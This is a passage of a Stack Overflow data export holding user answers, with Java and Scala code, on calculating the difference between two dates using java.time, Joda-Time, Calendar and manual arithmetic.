href=\"http://docs.oracle.com/javase/tutorial/datetime/TOC.html\" rel=\"noreferrer\">Oracle Tutorial</a>. And search Stack Overflow for many examples and explanations. Specification is <a href=\"https://jcp.org/en/jsr/detail?id=310\" rel=\"noreferrer\">JSR 310</a>.</p>\n\n<p>Where to obtain the java.time classes? </p>\n\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_8\" rel=\"noreferrer\"><strong>Java SE 8</strong></a> and <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_9\" rel=\"noreferrer\"><strong>SE 9</strong></a> and later\n\n<ul>\n<li>Built-in. </li>\n<li>Part of the standard Java API with a bundled implementation.</li>\n<li>Java 9 adds some minor features and fixes.</li>\n</ul></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_6\" rel=\"noreferrer\"><strong>Java SE 6</strong></a> and <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_7\" rel=\"noreferrer\"><strong>SE 7</strong></a>\n\n<ul>\n<li>Much of the java.time functionality is back-ported to Java 6 &amp; 7 in <a href=\"http://www.threeten.org/threetenbp/\" rel=\"noreferrer\"><strong><em>ThreeTen-Backport</em></strong></a>.</li>\n</ul></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Android_(operating_system)\" rel=\"noreferrer\"><strong>Android</strong></a>\n\n<ul>\n<li>The <a href=\"https://github.com/JakeWharton/ThreeTenABP\" rel=\"noreferrer\"><em>ThreeTenABP</em></a> project adapts <strong><em>ThreeTen-Backport</em></strong> (mentioned above) for Android specifically.</li>\n<li>See <a href=\"https://stackoverflow.com/q/38922754/642706\"><em>How to use…</em></a>.</li>\n</ul></li>\n</ul>\n\n<p>The <a href=\"http://www.threeten.org/threeten-extra/\" rel=\"noreferrer\">ThreeTen-Extra</a> project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. You may find some useful classes here such as <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Interval.html\" rel=\"noreferrer\"><code>Interval</code></a>, <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearWeek.html\" rel=\"noreferrer\"><code>YearWeek</code></a>, <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html\" rel=\"noreferrer\"><code>YearQuarter</code></a>, and <a href=\"http://www.threeten.org/threeten-extra/apidocs/index.html\" rel=\"noreferrer\">more</a>.</p>\n\n<hr>\n\n<h1>Joda-Time</h1>\n\n<p>UPDATE: The <a href=\"http://www.joda.org/joda-time/\" rel=\"noreferrer\">Joda-Time</a> project is now in <a href=\"https://en.wikipedia.org/wiki/Maintenance_mode\" rel=\"noreferrer\">maintenance mode</a>, with the team advising migration to the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> classes. I leave this section intact for history.</p>\n\n<p>The Joda-Time library uses ISO 8601 for its defaults. Its <code>Period</code> class parses and generates these PnYnMnDTnHnMnS strings.</p>\n\n<pre><code>DateTime now = DateTime.now(); // Caveat: Ignoring the important issue of time zones.\nPeriod period = new Period( now, now.plusHours( 4 ).plusMinutes( 30));\nSystem.out.println( \"period: \" + period );\n</code></pre>\n\n<p>Renders:</p>\n\n<pre><code>period: PT4H30M\n</code></pre>\n"},{"tags":[],"owner":{"account_id":108817,"reputation":111646,"user_id":288671,"display_name":"Vitalii Fedorenko"},"down_vote_count":1,"up_vote_count":79,"is_accepted":false,"score":78,"last_activity_date":1458166484,"creation_date":1398009611,"answer_id":23184523,"question_id":1555262,"body_markdown":"Using the [java.time][1] framework built into Java 8+:\n\n    ZonedDateTime now = ZonedDateTime.now();\n    ZonedDateTime oldDate = now.minusDays(1).minusMinutes(10);\n    Duration duration = Duration.between(oldDate, now);\n    System.out.println(&quot;ISO-8601: &quot; + duration);\n    System.out.println(&quot;Minutes: &quot; + duration.toMinutes());\n\n\nOutput: \n\n&gt; ISO-8601: PT24H10M\n&gt;\n&gt; Minutes: 1450\n\nFor more info, see the [Oracle Tutorial][2] and the [ISO 8601][3] standard.\n\n\n  [1]: http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\n  [2]: https://docs.oracle.com/javase/tutorial/datetime/TOC.html\n  [3]: https://en.wikipedia.org/wiki/ISO_8601#Durations","title":"Calculating the difference between two Java date instances","body":"<p>Using the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> framework built into Java 8+:</p>\n<pre><code>ZonedDateTime now = ZonedDateTime.now();\nZonedDateTime oldDate = now.minusDays(1).minusMinutes(10);\nDuration duration = Duration.between(oldDate, now);\nSystem.out.println(&quot;ISO-8601: &quot; + duration);\nSystem.out.println(&quot;Minutes: &quot; + duration.toMinutes());\n</code></pre>\n<p>Output:</p>\n<blockquote>\n<p>ISO-8601: PT24H10M</p>\n<p>Minutes: 1450</p>\n</blockquote>\n<p>For more info, see the <a href=\"https://docs.oracle.com/javase/tutorial/datetime/TOC.html\" rel=\"noreferrer\">Oracle Tutorial</a> and the <a href=\"https://en.wikipedia.org/wiki/ISO_8601#Durations\" rel=\"noreferrer\">ISO 8601</a> standard.</p>\n"},{"tags":[],"owner":{"account_id":2810135,"reputation":2075,"user_id":2416526,"display_name":"Max"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1402434414,"creation_date":1402434414,"answer_id":24150843,"question_id":1555262,"body_markdown":"Since you are using Scala, there is a very good Scala library [Lamma](http://www.lamma.io/doc/lamma_date). With Lamma you can minus date directly with `-` operator\r\n\r\n    scala&gt; Date(2015, 5, 5) - 2     // minus days by int\r\n    res1: io.lamma.Date = Date(2015,5,3)\r\n\r\n    scala&gt; Date(2015, 5, 15) - Date(2015, 5, 8)   // minus two days =&gt; difference between two days\r\n    res2: Int = 7\r\n","title":"Calculating the difference between two Java date instances","body":"<p>Since you are using Scala, there is a very good Scala library <a href=\"http://www.lamma.io/doc/lamma_date\" rel=\"nofollow\">Lamma</a>. With Lamma you can minus date directly with <code>-</code> operator</p>\n\n<pre><code>scala&gt; Date(2015, 5, 5) - 2     // minus days by int\nres1: io.lamma.Date = Date(2015,5,3)\n\nscala&gt; Date(2015, 5, 15) - Date(2015, 5, 8)   // minus two days =&gt; difference between two days\nres2: Int = 7\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5218478,"reputation":809,"user_id":4172628,"accept_rate":83,"display_name":"Revanth Kumar"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1414419101,"creation_date":1414417994,"answer_id":26589120,"question_id":1555262,"body_markdown":"Best thing to do is\r\n\r\n    (Date1-Date2)/86 400 000 \r\n\r\nThat number is the number of _milliseconds_ in a day. \r\n\r\nOne date-other date gives you difference in milliseconds. \r\n\r\nCollect the answer in a **double** variable.","title":"Calculating the difference between two Java date instances","body":"<p>Best thing to do is</p>\n\n<pre><code>(Date1-Date2)/86 400 000 \n</code></pre>\n\n<p>That number is the number of <em>milliseconds</em> in a day. </p>\n\n<p>One date-other date gives you difference in milliseconds. </p>\n\n<p>Collect the answer in a <strong>double</strong> variable.</p>\n"},{"tags":[],"owner":{"account_id":5374908,"reputation":1,"user_id":4282175,"display_name":"spysr"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1416671997,"creation_date":1416671997,"answer_id":27079353,"question_id":1555262,"body_markdown":"\tpublic static void main(String[] args) {\r\n\r\n\t\tString dateStart = &quot;01/14/2012 09:29:58&quot;;\r\n\t\tString dateStop = &quot;01/14/2012 10:31:48&quot;;\r\n\r\n\t\tSimpleDateFormat format = new SimpleDateFormat(&quot;MM/dd/yyyy HH:mm:ss&quot;);\r\n\r\n\t\tDate d1 = null;\r\n\t\tDate d2 = null;\r\n\r\n\t\ttry {\r\n\t\t\td1 = format.parse(dateStart);\r\n\t\t\td2 = format.parse(dateStop);\r\n\r\n\t\t\tDateTime date11 = new DateTime(d1);\r\n\t\t\tDateTime date22 = new DateTime(d2);\r\n\t\t\tint days = Days.daysBetween(date11.withTimeAtStartOfDay(), date22.withTimeAtStartOfDay()).getDays();\r\n\t\t\tint hours = Hours.hoursBetween(date11, date22).getHours() % 24;\r\n\t\t\tint minutes = Minutes.minutesBetween(date11, date22).getMinutes() % 60;\r\n\t\t\tint seconds = Seconds.secondsBetween(date11, date22).getSeconds() % 60;\r\n\t\t\tif (hours &gt; 0 || minutes &gt; 0 || seconds &gt; 0) {\r\n\t\t\t\tdays = days + 1;\r\n\t\t\t}\r\n\r\n\t\t\tSystem.out.println(days);\r\n\r\n\t\t} catch (Exception e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\r\n\t}\r\nThis will give date diff for the same day as well","title":"Calculating the difference between two Java date instances","body":"<pre><code>public static void main(String[] args) {\n\n    String dateStart = \"01/14/2012 09:29:58\";\n    String dateStop = \"01/14/2012 10:31:48\";\n\n    SimpleDateFormat format = new SimpleDateFormat(\"MM/dd/yyyy HH:mm:ss\");\n\n    Date d1 = null;\n    Date d2 = null;\n\n    try {\n        d1 = format.parse(dateStart);\n        d2 = format.parse(dateStop);\n\n        DateTime date11 = new DateTime(d1);\n        DateTime date22 = new DateTime(d2);\n        int days = Days.daysBetween(date11.withTimeAtStartOfDay(), date22.withTimeAtStartOfDay()).getDays();\n        int hours = Hours.hoursBetween(date11, date22).getHours() % 24;\n        int minutes = Minutes.minutesBetween(date11, date22).getMinutes() % 60;\n        int seconds = Seconds.secondsBetween(date11, date22).getSeconds() % 60;\n        if (hours &gt; 0 || minutes &gt; 0 || seconds &gt; 0) {\n            days = days + 1;\n        }\n\n        System.out.println(days);\n\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n\n}\n</code></pre>\n\n<p>This will give date diff for the same day as well</p>\n"},{"tags":[],"owner":{"account_id":978760,"reputation":1422,"user_id":999043,"accept_rate":83,"display_name":"Ralf H"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1419007334,"creation_date":1419007334,"answer_id":27570288,"question_id":1555262,"body_markdown":"I liked the TimeUnit-based approach until I found out that it only covers the trivial cases where the number of how many units of one timeunit are in the next higher unit is fixed. This breaks apart when you want to know how many months, year, etc are in between. \r\n\r\nhere is a counting approach, not as efficient as some others, but it seems to work for me and takes into account DST, too.\r\n\r\n\tpublic static String getOffsetAsString( Calendar cNow, Calendar cThen) {\r\n\t\tCalendar cBefore;\r\n\t\tCalendar cAfter;\r\n\t\tif ( cNow.getTimeInMillis() &lt; cThen.getTimeInMillis()) {\r\n\t\t\tcBefore = ( Calendar) cNow.clone();\r\n\t\t\tcAfter = cThen;\r\n\t\t} else {\r\n\t\t\tcBefore = ( Calendar) cThen.clone();\r\n\t\t\tcAfter = cNow;\r\n\t\t}\r\n\t\t// compute diff\r\n\t\tMap&lt;Integer, Long&gt; diffMap = new HashMap&lt;Integer, Long&gt;();\r\n\t\tint[] calFields = { Calendar.YEAR, Calendar.MONTH, Calendar.DAY_OF_MONTH, Calendar.HOUR_OF_DAY, Calendar.MINUTE, Calendar.SECOND, Calendar.MILLISECOND};\r\n\t\tfor ( int i = 0; i &lt; calFields.length; i++) {\r\n\t\t\tint field = calFields[ i];\r\n\t\t\tlong\td = computeDist( cAfter, cBefore, field);\r\n\t\t\tdiffMap.put( field, d);\r\n\t\t}\r\n\t\tfinal String result = String.format( &quot;%dY %02dM %dT %02d:%02d:%02d.%03d&quot;,\r\n\t\t\t\tdiffMap.get( Calendar.YEAR), diffMap.get( Calendar.MONTH), diffMap.get( Calendar.DAY_OF_MONTH), diffMap.get( Calendar.HOUR_OF_DAY), diffMap.get( Calendar.MINUTE), diffMap.get( Calendar.SECOND), diffMap.get( Calendar.MILLISECOND));\r\n\t\treturn result;\r\n\t}\r\n\r\n\tprivate static int computeDist( Calendar cAfter, Calendar cBefore, int field) {\r\n\t\tcBefore.setLenient( true);\r\n\t\tSystem.out.print( &quot;D &quot; + new Date( cBefore.getTimeInMillis()) + &quot; --- &quot; + new Date( cAfter.getTimeInMillis()) + &quot;: &quot;);\r\n\t\tint\tcount = 0;\r\n\t\tif ( cAfter.getTimeInMillis() &gt; cBefore.getTimeInMillis()) {\r\n\t\t\tint\tfVal = cBefore.get( field);\r\n\t\t\twhile ( cAfter.getTimeInMillis() &gt;= cBefore.getTimeInMillis()) {\r\n\t\t\t\tcount++;\r\n\t\t\t\tfVal = cBefore.get( field);\r\n\t\t\t\tcBefore.set( field, fVal + 1);\r\n\t\t\t\tSystem.out.print( count + &quot;/&quot;  + ( fVal + 1) + &quot;: &quot; + new Date( cBefore.getTimeInMillis()) + &quot; ] &quot;);\r\n\t\t\t}\r\n\t\t\tint result = count - 1;\r\n\t\t\tcBefore.set( field, fVal);\r\n\t\t\tSystem.out.println( &quot;&quot; + result + &quot; at: &quot; + field + &quot; cb = &quot; + new Date( cBefore.getTimeInMillis()));\r\n\t\t\treturn result;\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n","title":"Calculating the difference between two Java date instances","body":"<p>I liked the TimeUnit-based approach until I found out that it only covers the trivial cases where the number of how many units of one timeunit are in the next higher unit is fixed. This breaks apart when you want to know how many months, year, etc are in between. </p>\n\n<p>here is a counting approach, not as efficient as some others, but it seems to work for me and takes into account DST, too.</p>\n\n<pre><code>public static String getOffsetAsString( Calendar cNow, Calendar cThen) {\n    Calendar cBefore;\n    Calendar cAfter;\n    if ( cNow.getTimeInMillis() &lt; cThen.getTimeInMillis()) {\n        cBefore = ( Calendar) cNow.clone();\n        cAfter = cThen;\n    } else {\n        cBefore = ( Calendar) cThen.clone();\n        cAfter = cNow;\n    }\n    // compute diff\n    Map&lt;Integer, Long&gt; diffMap = new HashMap&lt;Integer, Long&gt;();\n    int[] calFields = { Calendar.YEAR, Calendar.MONTH, Calendar.DAY_OF_MONTH, Calendar.HOUR_OF_DAY, Calendar.MINUTE, Calendar.SECOND, Calendar.MILLISECOND};\n    for ( int i = 0; i &lt; calFields.length; i++) {\n        int field = calFields[ i];\n        long    d = computeDist( cAfter, cBefore, field);\n        diffMap.put( field, d);\n    }\n    final String result = String.format( \"%dY %02dM %dT %02d:%02d:%02d.%03d\",\n            diffMap.get( Calendar.YEAR), diffMap.get( Calendar.MONTH), diffMap.get( Calendar.DAY_OF_MONTH), diffMap.get( Calendar.HOUR_OF_DAY), diffMap.get( Calendar.MINUTE), diffMap.get( Calendar.SECOND), diffMap.get( Calendar.MILLISECOND));\n    return result;\n}\n\nprivate static int computeDist( Calendar cAfter, Calendar cBefore, int field) {\n    cBefore.setLenient( true);\n    System.out.print( \"D \" + new Date( cBefore.getTimeInMillis()) + \" --- \" + new Date( cAfter.getTimeInMillis()) + \": \");\n    int count = 0;\n    if ( cAfter.getTimeInMillis() &gt; cBefore.getTimeInMillis()) {\n        int fVal = cBefore.get( field);\n        while ( cAfter.getTimeInMillis() &gt;= cBefore.getTimeInMillis()) {\n            count++;\n            fVal = cBefore.get( field);\n            cBefore.set( field, fVal + 1);\n            System.out.print( count + \"/\"  + ( fVal + 1) + \": \" + new Date( cBefore.getTimeInMillis()) + \" ] \");\n        }\n        int result = count - 1;\n        cBefore.set( field, fVal);\n        System.out.println( \"\" + result + \" at: \" + field + \" cb = \" + new Date( cBefore.getTimeInMillis()));\n        return result;\n    }\n    return 0;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5055569,"reputation":3946,"user_id":4058910,"accept_rate":23,"display_name":"Shravan Ramamurthy"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1667908027,"creation_date":1420572957,"answer_id":27805882,"question_id":1555262,"body_markdown":"Note: startDate and endDates are -&gt; java.util.Date \r\n\r\n    import org.joda.time.Duration;\r\n    import org.joda.time.Interval;\r\n    // Use .getTime() unless it is a joda DateTime object\r\n    Interval interval = new Interval(startDate.getTime(), endDate.getTime());\r\n    Duration period = interval.toDuration();\r\n    //gives the number of days elapsed between start and end date.\r\n    period.getStandardDays();\r\n\r\n\r\n\r\nSimilar to days, you can also  get hours, minutes and seconds\r\n\r\n    period.getStandardHours();\r\n    period.getStandardMinutes();\r\n    period.getStandardSeconds();","title":"Calculating the difference between two Java date instances","body":"<p>Note: startDate and endDates are -&gt; java.util.Date</p>\n<pre><code>import org.joda.time.Duration;\nimport org.joda.time.Interval;\n// Use .getTime() unless it is a joda DateTime object\nInterval interval = new Interval(startDate.getTime(), endDate.getTime());\nDuration period = interval.toDuration();\n//gives the number of days elapsed between start and end date.\nperiod.getStandardDays();\n</code></pre>\n<p>Similar to days, you can also  get hours, minutes and seconds</p>\n<pre><code>period.getStandardHours();\nperiod.getStandardMinutes();\nperiod.getStandardSeconds();\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2306276,"reputation":70,"user_id":2025512,"display_name":"The N.."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1423721431,"creation_date":1422503033,"answer_id":28206669,"question_id":1555262,"body_markdown":"This is another sample. Which basically works for user-defined pattern.\r\n\r\n       public static LinkedHashMap&lt;String, Object&gt; checkDateDiff(DateTimeFormatter dtfObj, String startDate, String endDate)\r\n       {\r\n              Map&lt;String, Object&gt; dateDiffMap = new HashMap&lt;String, Object&gt;();\r\n              DateTime start = DateTime.parse(startDate,dtfObj);\r\n              DateTime end = DateTime.parse(endDate,dtfObj);\r\n              Interval interval = new Interval(start, end);\r\n              Period period = interval.toPeriod();\r\n              \r\n              dateDiffMap.put(&quot;ISO-8601_PERIOD_FORMAT&quot;, period);\r\n              dateDiffMap.put(&quot;YEAR&quot;, period.getYears());\r\n              dateDiffMap.put(&quot;MONTH&quot;, period.getMonths());\r\n              dateDiffMap.put(&quot;WEEK&quot;, period.getWeeks());\r\n              dateDiffMap.put(&quot;DAY&quot;, period.getWeeks());             \r\n              dateDiffMap.put(&quot;HOUR&quot;, period.getHours());\r\n              dateDiffMap.put(&quot;MINUTE&quot;, period.getMinutes());\r\n              dateDiffMap.put(&quot;SECOND&quot;, period.getSeconds());\r\n              \r\n              return dateDiffMap;        \r\n       }\r\n","title":"Calculating the difference between two Java date instances","body":"<p>This is another sample. Which basically works for user-defined pattern.</p>\n\n<pre><code>   public static LinkedHashMap&lt;String, Object&gt; checkDateDiff(DateTimeFormatter dtfObj, String startDate, String endDate)\n   {\n          Map&lt;String, Object&gt; dateDiffMap = new HashMap&lt;String, Object&gt;();\n          DateTime start = DateTime.parse(startDate,dtfObj);\n          DateTime end = DateTime.parse(endDate,dtfObj);\n          Interval interval = new Interval(start, end);\n          Period period = interval.toPeriod();\n\n          dateDiffMap.put(\"ISO-8601_PERIOD_FORMAT\", period);\n          dateDiffMap.put(\"YEAR\", period.getYears());\n          dateDiffMap.put(\"MONTH\", period.getMonths());\n          dateDiffMap.put(\"WEEK\", period.getWeeks());\n          dateDiffMap.put(\"DAY\", period.getWeeks());             \n          dateDiffMap.put(\"HOUR\", period.getHours());\n          dateDiffMap.put(\"MINUTE\", period.getMinutes());\n          dateDiffMap.put(\"SECOND\", period.getSeconds());\n\n          return dateDiffMap;        \n   }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5811991,"reputation":110,"user_id":4582731,"display_name":"Vishal Ganjare"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1426446828,"creation_date":1424331898,"answer_id":28600980,"question_id":1555262,"body_markdown":"Following code can give you the desired output:\r\n\r\n    String startDate = &quot;Jan 01 2015&quot;;\r\n    DateTimeFormatter formatter = DateTimeFormatter.ofPattern(&quot;MMM dd yyyy&quot;);\r\n    LocalDate date = LocalDate.parse(startDate, formatter);\r\n\t\t\r\n    String currentDate = &quot;Feb 11 2015&quot;;\r\n    LocalDate date1 = LocalDate.parse(currentDate, formatter);\r\n\t\t\r\n    System.out.println(date1.toEpochDay() - date.toEpochDay());","title":"Calculating the difference between two Java date instances","body":"<p>Following code can give you the desired output:</p>\n\n<pre><code>String startDate = \"Jan 01 2015\";\nDateTimeFormatter formatter = DateTimeFormatter.ofPattern(\"MMM dd yyyy\");\nLocalDate date = LocalDate.parse(startDate, formatter);\n\nString currentDate = \"Feb 11 2015\";\nLocalDate date1 = LocalDate.parse(currentDate, formatter);\n\nSystem.out.println(date1.toEpochDay() - date.toEpochDay());\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6826211,"reputation":31,"user_id":5251858,"display_name":"MugiWara No Carlos"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1440159062,"creation_date":1440159062,"answer_id":32140033,"question_id":1555262,"body_markdown":"Just to answer the initial question:\r\n\r\nPut the following code in a Function like Long getAge(){}\r\n\r\n\r\n    Date dahora = new Date();\r\n    long MillisToYearsByDiv = 1000l *60l * 60l * 24l * 365l;\r\n    long javaOffsetInMillis = 1990l * MillisToYearsByDiv;\r\n    long realNowInMillis = dahora.getTime() + javaOffsetInMillis;\r\n    long realBirthDayInMillis = this.getFechaNac().getTime() + javaOffsetInMillis;\r\n    long ageInMillis = realNowInMillis - realBirthDayInMillis;\r\n\r\n    return ageInMillis / MillisToYearsByDiv;\r\n\r\nThe most important here is to work with long numbers when multiplying and dividing. And of course, the offset that Java applies in its calculus of Dates.\r\n\r\n:)","title":"Calculating the difference between two Java date instances","body":"<p>Just to answer the initial question:</p>\n\n<p>Put the following code in a Function like Long getAge(){}</p>\n\n<pre><code>Date dahora = new Date();\nlong MillisToYearsByDiv = 1000l *60l * 60l * 24l * 365l;\nlong javaOffsetInMillis = 1990l * MillisToYearsByDiv;\nlong realNowInMillis = dahora.getTime() + javaOffsetInMillis;\nlong realBirthDayInMillis = this.getFechaNac().getTime() + javaOffsetInMillis;\nlong ageInMillis = realNowInMillis - realBirthDayInMillis;\n\nreturn ageInMillis / MillisToYearsByDiv;\n</code></pre>\n\n<p>The most important here is to work with long numbers when multiplying and dividing. And of course, the offset that Java applies in its calculus of Dates.</p>\n\n<p>:)</p>\n"},{"tags":[],"owner":{"account_id":3782951,"reputation":3298,"user_id":3141849,"accept_rate":70,"display_name":"Parth Solanki"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1440401470,"creation_date":1440401470,"answer_id":32176653,"question_id":1555262,"body_markdown":"    public static String getDifferenceBtwTime(Date dateTime) {\r\n\t\t\r\n\t\tlong timeDifferenceMilliseconds = new Date().getTime() - dateTime.getTime();\r\n\t\tlong diffSeconds = timeDifferenceMilliseconds / 1000;\r\n\t    long diffMinutes = timeDifferenceMilliseconds / (60 * 1000);\r\n\t    long diffHours = timeDifferenceMilliseconds / (60 * 60 * 1000);\r\n\t    long diffDays = timeDifferenceMilliseconds / (60 * 60 * 1000 * 24);\r\n\t    long diffWeeks = timeDifferenceMilliseconds / (60 * 60 * 1000 * 24 * 7);\r\n\t    long diffMonths = (long) (timeDifferenceMilliseconds / (60 * 60 * 1000 * 24 * 30.41666666));\r\n\t    long diffYears = (long)(timeDifferenceMilliseconds / (1000 * 60 * 60 * 24 * 365));\r\n\t    \r\n\t    if (diffSeconds &lt; 1) {\r\n\t        return &quot;one sec ago&quot;;\r\n\t    } else if (diffMinutes &lt; 1) {\r\n\t        return diffSeconds + &quot; seconds ago&quot;;\r\n\t    } else if (diffHours &lt; 1) {\r\n\t        return diffMinutes + &quot; minutes ago&quot;;\r\n\t    } else if (diffDays &lt; 1) {\r\n\t        return diffHours + &quot; hours ago&quot;;\r\n\t    } else if (diffWeeks &lt; 1) {\r\n\t        return diffDays + &quot; days ago&quot;;\r\n\t    } else if (diffMonths &lt; 1) {\r\n\t        return diffWeeks + &quot; weeks ago&quot;;\r\n\t    } else if (diffYears &lt; 12) {\r\n\t        return diffMonths + &quot; months ago&quot;;\r\n\t    } else {\r\n\t        return diffYears + &quot; years ago&quot;;\r\n\t    }\r\n\t}\t","title":"Calculating the difference between two Java date instances","body":"<pre><code>public static String getDifferenceBtwTime(Date dateTime) {\n\n    long timeDifferenceMilliseconds = new Date().getTime() - dateTime.getTime();\n    long diffSeconds = timeDifferenceMilliseconds / 1000;\n    long diffMinutes = timeDifferenceMilliseconds / (60 * 1000);\n    long diffHours = timeDifferenceMilliseconds / (60 * 60 * 1000);\n    long diffDays = timeDifferenceMilliseconds / (60 * 60 * 1000 * 24);\n    long diffWeeks = timeDifferenceMilliseconds / (60 * 60 * 1000 * 24 * 7);\n    long diffMonths = (long) (timeDifferenceMilliseconds / (60 * 60 * 1000 * 24 * 30.41666666));\n    long diffYears = (long)(timeDifferenceMilliseconds / (1000 * 60 * 60 * 24 * 365));\n\n    if (diffSeconds &lt; 1) {\n        return \"one sec ago\";\n    } else if (diffMinutes &lt; 1) {\n        return diffSeconds + \" seconds ago\";\n    } else if (diffHours &lt; 1) {\n        return diffMinutes + \" minutes ago\";\n    } else if (diffDays &lt; 1) {\n        return diffHours + \" hours ago\";\n    } else if (diffWeeks &lt; 1) {\n        return diffDays + \" days ago\";\n    } else if (diffMonths &lt; 1) {\n        return diffWeeks + \" weeks ago\";\n    } else if (diffYears &lt; 12) {\n        return diffMonths + \" months ago\";\n    } else {\n        return diffYears + \" years ago\";\n    }\n}   \n</code></pre>\n"},{"tags":[],"owner":{"account_id":4851105,"reputation":2446,"user_id":3913366,"accept_rate":79,"display_name":"Shubham A."},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1444106465,"creation_date":1444041811,"answer_id":32946660,"question_id":1555262,"body_markdown":"Just use below method with two `Date` objects. If you want to pass current date, just pass `new Date()` as a second parameter as it is initialised with current time.\r\n    \r\n    public String getDateDiffString(Date dateOne, Date dateTwo)\r\n    {\r\n        long timeOne = dateOne.getTime();\r\n        long timeTwo = dateTwo.getTime();\r\n        long oneDay = 1000 * 60 * 60 * 24;\r\n        long delta = (timeTwo - timeOne) / oneDay;\r\n\r\n        if (delta &gt; 0) {\r\n            return &quot;dateTwo is &quot; + delta + &quot; days after dateOne&quot;;\r\n        }\r\n        else {\r\n            delta *= -1;\r\n            return &quot;dateTwo is &quot; + delta + &quot; days before dateOne&quot;;\r\n         }\r\n    }\r\nAlso, apart from from number of days, if, you want other parameter difference too, use below snippet,\r\n\r\n    int year = delta / 365;\r\n    int rest = delta % 365;\r\n    int month = rest / 30;\r\n    rest = rest % 30;\r\n    int weeks = rest / 7;\r\n    int days = rest % 7;\r\n\r\nP.S Code is entirely taken from an SO answer.","title":"Calculating the difference between two Java date instances","body":"<p>Just use below method with two <code>Date</code> objects. If you want to pass current date, just pass <code>new Date()</code> as a second parameter as it is initialised with current time.</p>\n\n<pre><code>public String getDateDiffString(Date dateOne, Date dateTwo)\n{\n    long timeOne = dateOne.getTime();\n    long timeTwo = dateTwo.getTime();\n    long oneDay = 1000 * 60 * 60 * 24;\n    long delta = (timeTwo - timeOne) / oneDay;\n\n    if (delta &gt; 0) {\n        return \"dateTwo is \" + delta + \" days after dateOne\";\n    }\n    else {\n        delta *= -1;\n        return \"dateTwo is \" + delta + \" days before dateOne\";\n     }\n}\n</code></pre>\n\n<p>Also, apart from from number of days, if, you want other parameter difference too, use below snippet,</p>\n\n<pre><code>int year = delta / 365;\nint rest = delta % 365;\nint month = rest / 30;\nrest = rest % 30;\nint weeks = rest / 7;\nint days = rest % 7;\n</code></pre>\n\n<p>P.S Code is entirely taken from an SO answer.</p>\n"},{"tags":[],"owner":{"account_id":2693973,"reputation":4489,"user_id":2330860,"accept_rate":42,"display_name":"Vishal Kumar"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1445949055,"creation_date":1445949055,"answer_id":33368070,"question_id":1555262,"body_markdown":"There is an easy way to do this in java\r\n\r\n//create an utility method\r\n\r\n    public long getDaysBetweenDates(Date d1, Date d2){\r\n    return TimeUnit.MILLISECONDS.toDays(d1.getTime() - d2.getTime());\r\n    }\r\n\r\nThis method will return the number of days between the 2 dates. Either you can use the default java date format or can easily convert from any date format.","title":"Calculating the difference between two Java date instances","body":"<p>There is an easy way to do this in java</p>\n\n<p>//create an utility method</p>\n\n<pre><code>public long getDaysBetweenDates(Date d1, Date d2){\nreturn TimeUnit.MILLISECONDS.toDays(d1.getTime() - d2.getTime());\n}\n</code></pre>\n\n<p>This method will return the number of days between the 2 dates. Either you can use the default java date format or can easily convert from any date format.</p>\n"},{"tags":[],"owner":{"account_id":7213614,"reputation":354,"user_id":5506871,"display_name":"William Greendale"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1446250509,"creation_date":1446250509,"answer_id":33446658,"question_id":1555262,"body_markdown":"After having read many answers and comments to this question, I was left with the impression that one either has to use the Joda time or else take into account some peculiarities with the daylight saving time etc. Since I didn&#39;t want to do either of these, I ended up writing a few lines of code to calculate the difference between two dates without using any date or time related Java classes.\r\n\r\nIn the code below the numbers of year, month and day are the same as in real life. For example in December 24th 2015, the year = 2015, the month = 12 and the day = 24.\r\n\r\nI want to share this code in case someone else wants to use it. There are 3 methods: 1) A method to find out whether a given year is a leap year 2) A method to calculate the number of a given day in relation to January 1st of a given year 3) A method to calculate the number of days between any two dates using the method 2 (number of the end date minus number of the start date).\r\n\r\nHere are the methods:\r\n\r\n1)\r\n\r\n    public static boolean isLeapYear (int year) {\r\n        //Every 4. year is a leap year, except if the year is divisible by 100 and not by 400\r\n        //For example 1900 is not a leap year but 2000 is\r\n\r\n        boolean result = false;\r\n\r\n        if (year % 4 == 0) {\r\n            result = true;\r\n        }\r\n        if (year % 100 == 0) {\r\n            result = false;\r\n        }\r\n        if (year % 400 == 0) {\r\n            result = true;\r\n        }\r\n\r\n        return result;\r\n\r\n    }\r\n\r\n\r\n2)\r\n\r\n    public static int daysGoneSince (int yearZero, int year, int 